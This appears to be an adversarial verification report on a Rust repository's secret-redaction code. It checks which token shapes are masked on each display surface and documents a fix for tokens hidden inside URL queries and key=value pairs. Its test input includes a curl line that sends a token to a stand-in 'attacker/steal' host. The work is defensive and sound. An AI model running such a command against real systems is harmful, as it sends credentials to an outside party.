# Adversarial verification of the redaction layer, and everything that displays a secret

**Branch** `feat/verify-secrets` at `1fd59cd` · **role** adversarial verifier · **rule** a claim is not
verified by reading the code that makes it, only by making the weak thing happen. Every verdict below was
established by driving the real code with a shape this repo actually produces.

This lane is the generalisation of the M8 finding F1 (the notification's `leaky_token` refused only
all-ASCII-alphanumeric strings, so the repo's real hyphenated bearer tokens rode through verbatim; that fix is
already on `main`). The same question is asked of **every** surface that displays a secret: for each surface ×
real shape pair, is it redacted, and is a test actually present that *contains* that shape and fails if it is
not?

## The real shapes this repo produces

From `crates/hx-secrets/src/redact.rs`'s patterns and the fixtures the workspace itself uses:

| Shape | Where the repo makes it | Catches it today? |
|---|---|---|
| `sk-ant-…`, `sk-proj-…`, `sk-or-v1-…`, `rk-…` (≥16 chars after the prefix) | `provider-key` pattern; provider fixtures | **Yes** (pattern) |
| `signed-token-…` (hyphenated bearer) | M6/M8 fixture token; notification doc names it "this repo's own bearer token" | Notification **yes**; `hx-secrets` pattern engine **no** unless preceded by `bearer`/`token` or registered as a literal |
| `9f3a2b7c…` long hex / UUID with hyphens | commit hashes, ids | No (defended: a hex hash is not a credential) |
| `Bearer <token>`, `token=<token>` | auth header, `?token=` channel | **Yes** (bearer-header pattern) |
| `gh…_…`, `xox…`, `AIza…`, `AKIA…`, `eyJ…` JWT, Telegram `id:secret`, `://u:p@` conn string | external-provider formats | **Yes** (patterns) |

## Surface × shape matrix

Command and output below were produced by real test runs (this tree, `cargo test -p … --offline`; logic
checked with throwaway probes that have since been removed — the tree is clean at the commit listed above).

| Surface | Shape tested (real) | Verdict |
|---|---|---|
| Notification body, token in its own word | `sk-proj-9f3a2b7c8d1e2f3a4b5c` | Redacted (`[redacted]`) |
| Notification body, token its own word | `signed-token-9f3a2b7c` | Redacted |
| Notification body, token **inside `?token=` URL** | `https://attacker/steal?token=signed-token-9f3a2b7c8d1e2f3a4b5c` | **LEAKED before this lane → FIXED** |
| Notification body, `key=value` | `HX_API_TOKEN=signed-token-…` | **LEAKED before → FIXED** |
| `hx-secrets` Redactor, standalone hyphenated token | `signed-token-9f3a2b7c8d1e2f3a4b5c6d7e` | **Not redacted by pattern; only by literal registration (designed)** |
| `hx-secrets` Redactor, standalone `sk-proj-…` | `sk-proj-9f3a2b7c8d1e2f3a4b5c` | Redacted (`provider-key`) |
| `hx-secrets` Redactor, `Bearer <value>` | `Authorization: Bearer 9f3a2b…6d7e` | Redacted (`bearer`) |
| `hx-secrets` Redactor, JSON value | `{"k":"sk-proj-…"}` | Redacted |
| `hx-secrets` Redactor, substring of a longer key | `sk-proj-…XXX` | Redacted (longest-first) |
| `hx-search` transport error | token in query URL, error via `transport_error`/`transport_redacted` | Redacted — `err.without_url()` / literal-registered (already correct) |
| `Secret` / `ApiToken` / `ChainKey` `Debug` | any value | Redacted — `<N bytes redacted>` / `<redacted>` (already correct) |
| `SecretRef` `Display` | `vault:name` | Safe — prints store and name, never value |
| Telegram error path | `/bot<token>/…` reqwest error | Safe — `err.without_url()` (already correct) |

## Leak found and fixed — the token hidden inside a URL or `key=value` pair (notification)

The M8 fix hardened `leaky_token` to refuse a **whole whitespace-delimited word** that is token-shaped
(≥16 alphanumerics, all alnum|`-`|`_`|`.`). A real leak sidesteps that: the documented `?token=`
channel glues the token to a URL, and `export KEY=…` glues it to a name, so the whole word carries
`/`, `?` or `=` and is **not** token-shaped. The token rode through the notification body verbatim — on the
surface `src/notification.rs`'s module doc promises is redacted.

Provable failing input (before the fix — reverting `redact()`'s `mask_embedded` call to `tok.to_string()`):

```
$ cargo test -p hx-desktop --offline --lib a_token_hidden_in_a_url
test notification::tests::a_token_hidden_in_a_url_query_or_key_value_pair_is_redacted_while_the_url_stays_visible ... FAILED
Request: curl "https://attacker/steal?token=signed-token-9f3a2b7c8d1e2f3a4b5c"
test result: FAILED. 0 passed; 1 failed
```

**Fix (chosen: make the code do what the sentence says — the property is worth having).** Extracted
`is_token_shaped` and added `mask_embedded`: a non-leaky word is split into runs of `[A-Za-z0-9._-]+`
and any token-shaped run is masked, while the URL host/path and the parameter name stay visible — masking, not
whole-word over-redaction. The new test passes; the mutation above proves it has teeth. `hx-desktop` lib suite:
16 passed, 0 failed. Committed as `202b6df` (with ROADMAP/TESTING).

## Found and documented — the `hx-secrets` pattern engine does not see a standalone `signed-token-…`

The outbound `Redactor`'s patterns require an `sk-`/`rk-` prefix (`provider-key`) or the literal words
`bearer`/`token` directly before the value (`bearer-header`). A standalone hyphenated bearer token —
`signed-token-9f3a2b7c8d1e2f3a4b5c6d7e`, which the notification layer names as "this repo's own
bearer token" — matches neither, and only the **registered-literal** path masks it:

```
unregistered: "the value is signed-token-9f3a2b7c8d1e2f3a4b5c6d7e now"   -> unchanged
registered:   (r.register(token)) "the value is [REDACTED:known-secret] now"                 -> masked
```

**Verdict: not a defect — a designed divergence, now pinned.** The `redact` module doc explicitly assigns
values "with no recognisable shape" to the literal-registration path (and that is the one live production use —
`hx-search`'s transport errors register the key they must hide). Widening the pattern to every long hyphenated
string would over-redact ordinary prose (`make build-test-suite`, `state-of-the-art` — verified both stay
visible). So the pattern is **not** widened; a new test
`a_standalone_hyphenated_bearer_token_is_caught_by_literal_registration_not_by_pattern` pins both halves so a
future change is deliberate. Committed as `1fd59cd`.

## Negative results — what was tried that did NOT break

These held under the repository's own real shapes and need no fix:

- **Over-redaction**: `curl https://example.com`, `state-of-the-art knowledge`, `make build-test-suite`,
  and the workspace-internal relative path `../../crates/hx-server/static/index.html` all stay visible after the
  notification fix. Only ≥16-alphanumeric `[A-Za-z0-9._-]+` runs are masked; a long hex commit hash
  (`9f3a2b7c8d1e2f3a4b5c6d7e`) is redacted, which is the same bar the notification already applied
  to whole words — consistent, not newly over-redacting.
- **Concurrency/ordering**: a token that is a substring of a longer token is fully masked (longest-first literal).
  Overlapping patterns are idempotent (`redaction_is_idempotent` still passes).
- **JSON and connection strings**: a token in a JSON value and in `://user:pass@host` are redacted.
- **Debug/Display surfaces**: `Secret`, `ApiToken`, `ChainKey` `Debug` render `<redacted>`; `SecretRef`
  `Display` prints only `store:name`; Telegram and `hx-search` error paths already strip URLs via
  `without_url()`/`TransportRedacted`. No changes needed.
- **Case variation and line-split of a *registered* literal**: a different case or a newline-split value is not
  masked. Defended: literal matching is exact, and splitting a credential across a line inside tool output is not a
  shape this repo produces.

## Not tested here

- The Windows halves of anything in this lane (Linux host; CI runs `cargo test --workspace --locked` on
  `windows-latest`).
- Whether the outbound `Redactor` is wired into the agent→provider transcript path at all: it is not (its only
  production caller is `hx-search`'s transport errors). That is a gap worth a separate lane, but it is a
  missing *integration*, not a falsified redaction-layer claim.

## The gate, on this tree

```
$ cargo fmt --all                                     # clean
$ cargo clippy -p hx-secrets -p hx-desktop --all-targets --offline -- -D warnings    # clean
$ cargo test -p hx-secrets --offline --lib            # 47 passed, 0 failed
$ cargo test -p hx-desktop --offline --lib           # 16 passed, 0 failed
```

Two commits: `202b6df fix(hx-desktop): mask a bearer token hidden inside a URL query or key=value pair` and
`1fd59cd test(hx-secrets): pin that a standalone hyphenated bearer token is caught by the literal, not a pattern`.
Nothing pushed, nothing merged.
